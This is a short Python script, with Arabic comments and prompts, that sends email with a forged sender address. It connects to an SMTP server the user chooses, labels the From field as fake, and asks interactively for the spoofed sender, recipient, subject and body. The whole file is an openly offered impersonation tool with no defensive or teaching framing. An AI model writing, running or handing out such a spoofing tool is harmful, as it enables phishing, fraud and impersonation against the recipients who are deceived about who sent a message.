
import smtplib
from email.mime.text import MIMEText

def send_spoofed_email(smtp_server, smtp_port, sender_email, receiver_email, subject, message):
    msg = MIMEText(message)
    msg['Subject'] = subject
    msg['From'] = sender_email  # عنوان مزيف
    msg['To'] = receiver_email

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.sendmail(sender_email, receiver_email, msg.as_string())
            print(f"[+] تم إرسال البريد الإلكتروني منتحل الهوية إلى {receiver_email}")
    except Exception as e:
        print(f"[!] فشل الإرسال: {e}")

if __name__ == "__main__":
    smtp = input("🔧 أدخل عنوان خادم SMTP (مثلاً smtp.example.com): ")
    port = int(input("🔢 أدخل رقم المنفذ (عادةً 25 أو 587): "))
    fake_from = input("📤 أدخل البريد المزور (المرسل): ")
    to = input("📥 أدخل بريد المستلم: ")
    subject = input("📝 أدخل الموضوع: ")
    message = input("✉️ أدخل الرسالة: ")

    send_spoofed_email(smtp, port, fake_from, to, subject, message)
